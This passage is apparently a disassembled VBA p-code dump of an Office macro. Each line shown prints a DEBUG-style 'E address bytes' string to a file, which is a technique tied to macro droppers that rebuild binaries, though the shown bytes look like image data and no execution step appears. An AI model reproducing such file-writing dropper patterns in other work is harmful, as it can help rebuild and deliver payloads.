' 	LitStr 0x0036 "E A6F0 A7 A9 BD CE B8 CE E0 A1 B9 CB 75 8D A1 5A 73 87"
' 	PrintItemNL 
' Line #2866:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A700 5E 77 8B 7B 93 A9 8A A1 B7 93 AA C0 72 89 9F 3F"
' 	PrintItemNL 
' Line #2867:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A710 54 6A 3B 4B 62 27 35 4C 00 0A 21 30 3F 59 80 8F"
' 	PrintItemNL 
' Line #2868:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A720 A9 7B 8C A7 73 83 A0 5A 6C 8B 7B 8D AC 75 88 A9"
' 	PrintItemNL 
' Line #2869:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A730 6B 7E A1 72 85 AA 74 87 AC 66 7B A1 55 6A 90 71"
' 	PrintItemNL 
' Line #2870:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A740 86 AC 71 84 A9 68 7C 9F 64 7A 9D 63 79 9C 5C 75"
' 	PrintItemNL 
' Line #2871:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A750 97 71 89 AD 72 8C B1 73 8C B4 77 8F B9 70 88 B2"
' 	PrintItemNL 
' Line #2872:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A760 74 8D B5 79 93 B8 73 8C AE 75 8F AD 84 9F B9 8A"
' 	PrintItemNL 
' Line #2873:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A770 A5 BF 7A 93 B3 7A 93 B5 7E 95 BB 7A 91 B7 71 87"
' 	PrintItemNL 
' Line #2874:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A780 AB 77 8E AE 8B A2 BC 9D B4 CA 84 99 AF 86 9B B1"
' 	PrintItemNL 
' Line #2875:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A790 34 42 5E 44 52 6F 65 70 8E 69 75 91 64 72 89 73"
' 	PrintItemNL 
' Line #2876:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A7A0 84 99 64 7B 91 6C 87 9C 62 7B 8F 66 7E 92 4D 63"
' 	PrintItemNL 
' Line #2877:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A7B0 75 55 6C 7C 5B 70 7F 47 5C 6B 8E A1 B0 92 A5 B4"
' 	PrintItemNL 
' Line #2878:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A7C0 75 88 97 82 95 A4 65 79 8A 64 78 89 75 8B 9D 6A"
' 	PrintItemNL 
' Line #2879:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A7D0 82 96 72 8E A6 72 8E A6 72 8B 9F 7F 96 A6 9A AB"
' 	PrintItemNL 
' Line #2880:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A7E0 B8 9B AA B3 BB C7 CD DD E9 ED E2 ED F1 A8 B3 B7"
' 	PrintItemNL 
' Line #2881:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A7F0 6F 7B 7F 81 8D 91 81 8C 90 98 A3 A7 DB E4 E7 F4"
' 	PrintItemNL 
' Line #2882:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A800 FF FF B1 BC C0 2B 36 3A 45 4F 4F 54 5C 5B 50 58"
' 	PrintItemNL 
' Line #2883:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A810 57 00 01 00 00 00 F8 F8 F8 E9 E9 E9 DE DE DE D1"
' 	PrintItemNL 
' Line #2884:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A820 D1 D1 C4 C6 C7 B3 B6 BA 02 08 0D 8C 95 9E 89 95"
' 	PrintItemNL 
' Line #2885:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A830 A1 72 82 8F 66 75 85 69 79 89 77 87 94 7B 8B 97"
' 	PrintItemNL 
' Line #2886:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A840 77 83 8F 6A 76 82 71 7E 8E 6F 7B 8D 78 86 99 81"
' 	PrintItemNL 
' Line #2887:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A850 90 A3 87 98 AB A2 B6 C8 BA D0 E2 B7 CF E1 91 A9"
' 	PrintItemNL 
' Line #2888:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A860 BB 71 89 9B 68 82 93 72 8B 9F 83 9C B0 90 A9 BD"
' 	PrintItemNL 
' Line #2889:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A870 7E 97 AB 48 60 74 43 56 6B 2E 3F 54 05 16 2B 2F"
' 	PrintItemNL 
' Line #2890:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A880 41 58 73 85 9C 68 79 93 75 86 A1 64 76 93 73 85"
' 	PrintItemNL 
' Line #2891:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A890 A4 75 88 A9 71 84 A5 73 87 AA 72 86 A9 65 7B 9F"
' 	PrintItemNL 
' Line #2892:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A8A0 54 6A 8E 77 8D B1 76 8A AD 6D 81 A4 63 7A 9A 5E"
' 	PrintItemNL 
' Line #2893:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A8B0 75 95 5B 74 94 79 92 B4 74 8E B3 72 8B B3 7D 95"
' 	PrintItemNL 
' Line #2894:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A8C0 BF 6E 86 B0 77 8D B6 7D 95 B9 76 8D AD 7D 95 B1"
' 	PrintItemNL 
' Line #2895:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A8D0 8E A8 C0 92 AC C4 81 9B B9 7C 97 B9 7D 97 BB 7B"
' 	PrintItemNL 
' Line #2896:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A8E0 93 B7 79 8F B2 84 9C BA 9B B3 CB 9F B7 CB 91 A6"
' 	PrintItemNL 
' Line #2897:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A8F0 BB 86 9B B0 37 46 60 58 66 82 6A 76 92 69 75 91"
' 	PrintItemNL 
' Line #2898:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A900 63 6F 87 69 79 90 60 77 8D 6A 82 98 5D 75 89 5E"
' 	PrintItemNL 
' Line #2899:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A910 76 8A 4A 60 72 53 6A 7A 54 69 78 5F 72 81 AB BE"
' 	PrintItemNL 
' Line #2900:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A920 CB 8E A1 AE 7B 8E 9D 83 96 A5 62 77 86 76 8B 9A"
' 	PrintItemNL 
' Line #2901:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A930 81 98 A8 6E 86 9A 80 9C B4 72 90 A9 79 92 A6 8B"
' 	PrintItemNL 
' Line #2902:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A940 A2 B2 9C AE B9 93 A3 AA BC C8 CC DB E6 EA DA E5"
' 	PrintItemNL 
' Line #2903:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A950 E9 A1 AC B0 67 73 77 6E 7A 7E 53 5E 62 6E 79 7D"
' 	PrintItemNL 
' Line #2904:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A960 D0 D9 DC F4 FF FF BB C5 CC 37 41 48 4E 57 5A 5E"
' 	PrintItemNL 
' Line #2905:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A970 66 66 52 5A 5A 00 02 02 00 00 F7 F7 F7 E9 E9 E9"
' 	PrintItemNL 
' Line #2906:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A980 DE DE DE D1 D1 D1 C3 C5 C6 B1 B4 B8 00 04 09 85"
' 	PrintItemNL 
' Line #2907:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A990 8E 97 5A 66 72 5B 6B 78 6D 7C 8C 7E 8E 9E 8B 9B"
' 	PrintItemNL 
' Line #2908:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A9A0 A8 7E 8E 9A 7C 88 94 7D 89 95 90 9C AE 8B 96 AA"
' 	PrintItemNL 
' Line #2909:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A9B0 85 93 A6 7C 8B 9E 80 8F A2 9D B1 C3 BA CE E0 BA"
' 	PrintItemNL 
' Line #2910:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A9C0 D0 E2 A5 BD CF 8E A6 B8 7A 94 A5 6D 87 98 7D 96"
' 	PrintItemNL 
' Line #2911:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A9D0 AA 8B A4 B8 8B A4 B8 61 79 8D 40 53 68 29 3C 51"
' 	PrintItemNL 
' Line #2912:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A9E0 0B 1E 33 2A 3D 52 70 82 99 62 77 8D 6C 80 99 66"
' 	PrintItemNL 
' Line #2913:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A9F0 7B 96 6A 7F 9B 74 89 A8 77 8C AB 77 8E AE 75 8B"
' 	PrintItemNL 
' Line #2914:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AA00 AE 65 7E A0 4D 65 89 71 89 AD 75 8B AE 74 88 AB"
' 	PrintItemNL 
' Line #2915:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AA10 67 7E 9E 5C 73 93 5A 73 93 81 9A BC 75 8F B3 6F"
' 	PrintItemNL 
' Line #2916:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AA20 89 AE 7F 98 C0 6B 84 AC 78 8F B5 80 96 B9 77 8F"
' 	PrintItemNL 
' Line #2917:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AA30 AD 88 9F B9 99 B2 C6 96 AE C4 8E A9 C4 88 A1 C1"
' 	PrintItemNL 
' Line #2918:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AA40 84 9D BF 7E 97 B9 81 98 B8 8F A7 C3 A7 BF D5 9E"
' 	PrintItemNL 
' Line #2919:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AA50 B8 C9 A4 BC CE 82 97 AC 3C 4D 67 5D 6E 89 66 74"
' 	PrintItemNL 
' Line #2920:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AA60 90 66 75 8F 5D 6C 86 5D 6F 86 6F 86 9C 68 80 96"
' 	PrintItemNL 
' Line #2921:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AA70 62 7A 8E 60 78 8A 51 67 79 5C 70 81 67 7A 89 84"
' 	PrintItemNL 
' Line #2922:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AA80 97 A6 A1 B4 C1 7B 8E 9B 76 89 98 6C 7F 8E 5B 70"
' 	PrintItemNL 
' Line #2923:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AA90 7F 7F 94 A3 7F 96 A6 6C 84 98 77 92 AC 6E 8C A5"
' 	PrintItemNL 
' Line #2924:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AAA0 7F 98 AC 96 AB BA A3 B4 BD 9B A9 AF D0 DB DF F0"
' 	PrintItemNL 
' Line #2925:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AAB0 FC FE EA F5 F9 A8 B3 B7 68 74 78 73 7F 83 52 5D"
' 	PrintItemNL 
' Line #2926:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AAC0 61 6F 7B 7D D2 DB DE F6 FF FF BD C7 CE 43 4D 54"
' 	PrintItemNL 
' Line #2927:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AAD0 40 49 4C 50 58 58 45 4D 4D 00 02 02 00 00 F4 F4"
' 	PrintItemNL 
' Line #2928:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AAE0 F4 EB EB EB E0 E0 E0 CF CF CF C3 C5 C6 B2 B5 B9"
' 	PrintItemNL 
' Line #2929:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AAF0 00 00 04 68 71 7A 67 73 7F 67 77 84 73 82 92 7B"
' 	PrintItemNL 
' Line #2930:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AB00 8B 9B 85 95 A2 6E 7E 8A 61 6D 79 5E 6A 76 72 7E"
' 	PrintItemNL 
' Line #2931:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AB10 90 77 82 98 71 7E 94 67 75 8B 71 80 93 94 A8 BA"
' 	PrintItemNL 
' Line #2932:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AB20 B8 CC DE C1 D7 E9 B6 CE E0 9F B7 C9 83 9D AE 70"
' 	PrintItemNL 
' Line #2933:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AB30 8A 9B 86 A0 B1 8C A6 B7 97 B1 C2 85 9D AF 43 59"
' 	PrintItemNL 
' Line #2934:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AB40 6B 27 3D 4F 11 27 39 19 2F 41 71 86 9B 70 87 9D"
' 	PrintItemNL 
' Line #2935:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AB50 65 7B 94 69 80 9A 63 7A 94 70 88 A4 78 90 AE 7C"
' 	PrintItemNL 
' Line #2936:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AB60 96 B4 7F 98 B8 6E 8A A9 4A 65 87 69 82 A4 71 87"
' 	PrintItemNL 
' Line #2937:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AB70 AA 7B 8F B2 72 89 A9 60 77 97 5A 73 93 86 9F C1"
' 	PrintItemNL 
' Line #2938:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AB80 76 90 B4 6E 88 AD 7D 96 BE 69 82 AA 7A 91 B7 83"
' 	PrintItemNL 
' Line #2939:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AB90 99 BC 7D 92 B1 94 AA C3 A2 BA CC 97 AF C1 9C B3"
' 	PrintItemNL 
' Line #2940:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E ABA0 CD 93 AB C9 8D A4 C4 83 9A BA 88 9D BC 99 B0 CA"
' 	PrintItemNL 
' Line #2941:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E ABB0 B3 CB E1 A4 BE CF A6 C0 D1 75 8D 9F 43 5A 70 5A"
' 	PrintItemNL 
' Line #2942:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E ABC0 70 89 5E 73 8E 60 76 8F 56 6C 85 5A 71 87 7B 93"
' 	PrintItemNL 
' Line #2943:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E ABD0 A9 5E 76 8C 6B 83 97 6B 83 95 5C 72 84 69 7D 8E"
' 	PrintItemNL 
' Line #2944:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E ABE0 82 95 A4 9A AD BC 8D A0 AD 71 84 91 74 87 94 59"
' 	PrintItemNL 
' Line #2945:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E ABF0 6C 79 65 7A 89 80 95 A4 73 87 98 71 89 9D 6D 88"
' 	PrintItemNL 
' Line #2946:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AC00 A2 74 92 AB 8B A4 B8 99 AE BD 9E AF B8 8F 9E A1"
' 	PrintItemNL 
' Line #2947:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AC10 CA D6 D8 F2 FC FC E2 EE F0 A8 B4 B6 71 7D 81 85"
' 	PrintItemNL 
' Line #2948:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AC20 91 95 65 70 74 82 8E 90 CB D4 D7 C9 D2 D5 BF C9"
' 	PrintItemNL 
' Line #2949:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AC30 D0 55 5F 66 36 3F 43 48 4F 52 3E 45 48 00 03 06"
' 	PrintItemNL 
' Line #2950:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AC40 00 00 F7 F7 F7 F0 F0 F0 E1 E1 E1 CB CB CB C4 C6"
' 	PrintItemNL 
' Line #2951:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AC50 C7 BB BE C2 00 00 04 60 69 72 7A 86 92 82 92 9F"
' 	PrintItemNL 
' Line #2952:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AC60 8E 9D AD 87 97 A7 86 95 A5 6C 7C 89 6A 76 82 71"
' 	PrintItemNL 
' Line #2953:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AC70 7C 8A 60 6C 7E 5F 6A 7E 66 73 89 75 83 96 7D 8C"
' 	PrintItemNL 
' Line #2954:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AC80 9F 86 97 AA A2 B6 C8 C2 D8 EA CA E0 F2 A9 BF D1"
' 	PrintItemNL 
' Line #2955:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AC90 85 9D AF 79 91 A3 96 AE C0 8D A5 B7 9A B2 C4 9A"
' 	PrintItemNL 
' Line #2956:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E ACA0 B3 C3 68 7F 8F 3C 50 61 14 28 39 00 11 23 64 7A"
' 	PrintItemNL 
' Line #2957:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E ACB0 8C 7F 97 AB 70 87 9D 87 9F B7 5F 76 90 6C 85 9F"
' 	PrintItemNL 
' Line #2958:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E ACC0 78 90 AC 81 9C B7 8B A6 C1 79 95 B3 4C 68 86 64"
' 	PrintItemNL 
' Line #2959:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E ACD0 7E 9C 6C 82 A5 80 94 B7 7B 92 B2 65 7C 9C 5B 74"
' 	PrintItemNL 
' Line #2960:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E ACE0 94 88 A1 C3 78 91 B3 6E 88 AC 7D 94 BA 69 81 A5"
' 	PrintItemNL 
' Line #2961:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E ACF0 7E 94 B7 86 9D BD 82 99 B3 9C B3 C9 A8 C0 D2 96"
' 	PrintItemNL 
' Line #2962:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AD00 AE C0 9E B4 CD 98 AE CA 92 A8 C4 86 9C B8 8A A0"
' 	PrintItemNL 
' Line #2963:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AD10 BC 9D B5 CD BC D5 E9 AC C6 D7 9B B5 C6 68 82 93"
' 	PrintItemNL 
' Line #2964:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AD20 4C 64 7A 5B 73 8B 5D 75 8D 60 78 90 55 6D 83 61"
' 	PrintItemNL 
' Line #2965:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AD30 79 8F 79 91 A7 4C 64 78 6A 82 96 72 88 9A 5E 75"
' 	PrintItemNL 
' Line #2966:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AD40 85 6D 82 91 8C A1 B0 94 A9 B8 8E A1 B0 7B 90 9F"
' 	PrintItemNL 
' Line #2967:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AD50 82 95 A4 5D 72 81 80 95 A4 88 9C AD 70 84 95 85"
' 	PrintItemNL 
' Line #2968:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AD60 9D AF 74 8E A6 8A A4 BC 9B B3 C7 9B AE BD 90 A1"
' 	PrintItemNL 
' Line #2969:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AD70 AA 73 82 85 AB B7 B9 D6 DF E2 C5 D1 D3 A6 B1 B5"
' 	PrintItemNL 
' Line #2970:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AD80 74 80 84 74 80 84 4E 5A 5E 89 96 98 E7 F3 F5 DD"
' 	PrintItemNL 
' Line #2971:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AD90 E9 EB AD B9 BD 55 61 67 2C 37 3B 44 4D 50 37 40"
' 	PrintItemNL 
' Line #2972:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E ADA0 43 00 00 03 00 00 FC FD FB ED EE EC DA DB D9 D0"
' 	PrintItemNL 
' Line #2973:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E ADB0 D1 CF C0 C2 C2 B5 B9 BA 00 00 04 72 7B 84 60 6C"
' 	PrintItemNL 
' Line #2974:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E ADC0 78 62 72 7F 70 7F 8F 75 85 95 7C 8B 9B 79 89 96"
' 	PrintItemNL 
' Line #2975:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E ADD0 76 82 8E 85 90 9E 76 82 94 6B 79 8B 83 91 A4 7C"
' 	PrintItemNL 
' Line #2976:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E ADE0 8A 9C 7C 8C 9D 96 A6 B7 99 AB BC AA BC CD CD DF"
' 	PrintItemNL 
' Line #2977:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E ADF0 F0 BE D2 E3 98 AC BD 84 98 A9 94 AB BB 9D B4 C4"
' 	PrintItemNL 
' Line #2978:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AE00 95 AC BC 97 AB BC 7B 8E 9D 4F 5F 6F 45 58 67 00"
' 	PrintItemNL 
' Line #2979:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AE10 0B 1C 2F 40 53 8C 9F B4 6A 7C 93 A2 B7 CD 77 8D"
' 	PrintItemNL 
' Line #2980:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AE20 A6 52 6A 82 76 8E A6 8C A6 BE 79 93 AB 92 AF C4"
' 	PrintItemNL 
' Line #2981:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AE30 5B 78 8D 67 83 9B 6B 82 A2 77 8D B0 86 9C BF 71"
' 	PrintItemNL 
' Line #2982:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AE40 87 AA 5F 75 98 94 AA CD 87 9D C0 7B 94 B6 7B 91"
' 	PrintItemNL 
' Line #2983:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AE50 B4 68 7F 9F 91 A9 C7 85 9E B8 7E 98 B0 A6 BF D3"
' 	PrintItemNL 
' Line #2984:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AE60 99 B3 C4 A4 BE CF AC C3 D9 8C A2 BB 8D A3 BC 87"
' 	PrintItemNL 
' Line #2985:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AE70 9D B6 9D B3 CC AA C1 D7 C8 DF F5 AB C3 D7 94 AC"
' 	PrintItemNL 
' Line #2986:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AE80 C0 59 71 85 4C 63 79 5F 76 8C 72 89 9F 5E 75 8B"
' 	PrintItemNL 
' Line #2987:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AE90 5E 75 8B 79 90 A6 65 7D 91 58 6D 82 8A A0 B2 5E"
' 	PrintItemNL 
' Line #2988:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AEA0 75 85 5B 72 81 73 8A 99 87 9E AD 94 AB BA 79 8D"
' 	PrintItemNL 
' Line #2989:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AEB0 9E 92 A9 B9 75 89 9B 65 7B 8D 85 9B AD 73 8A 9A"
' 	PrintItemNL 
' Line #2990:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AEC0 7D 94 A4 74 8B 9B 7C 94 A8 90 A8 BC 98 AC BD A9"
' 	PrintItemNL 
' Line #2991:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AED0 BC C9 97 A9 B0 62 70 76 B6 C1 C5 F3 FE FF CE D7"
' 	PrintItemNL 
' Line #2992:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AEE0 DB 91 9B A2 77 83 89 6F 7D 83 60 6F 72 78 8A 8B"
' 	PrintItemNL 
' Line #2993:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AEF0 C2 D4 D5 BE D0 CF 9F AE B0 66 75 78 53 60 62 3D"
' 	PrintItemNL 
' Line #2994:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AF00 4A 4C 3D 4A 4C 00 01 03 00 00 F5 F6 F4 EC ED EB"
' 	PrintItemNL 
' Line #2995:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AF10 DB DC DA D0 D1 CF C0 C2 C2 B5 B9 BA 00 02 07 85"
' 	PrintItemNL 
' Line #2996:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AF20 8E 97 79 85 91 64 74 81 5F 6D 7F 63 73 84 79 88"
' 	PrintItemNL 
' Line #2997:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AF30 98 84 94 A1 7A 85 93 73 80 8E 76 83 93 79 87 99"
' 	PrintItemNL 
' Line #2998:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AF40 86 94 A6 79 87 99 7D 8D 9E 99 A9 BA A7 B7 C8 BA"
' 	PrintItemNL 
' Line #2999:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AF50 CA DB BD CF E0 D7 E9 FA C4 D6 E7 99 AB BC 93 A7"
' 	PrintItemNL 
' Line #3000:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AF60 B8 A5 B9 CA A5 B9 CA 9D B0 BF A3 B4 C1 5B 6B 78"
' 	PrintItemNL 
' Line #3001:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AF70 31 41 51 1D 2D 3D 1A 2C 3D 7D 8E A1 86 98 AF 8D"
' 	PrintItemNL 
' Line #3002:
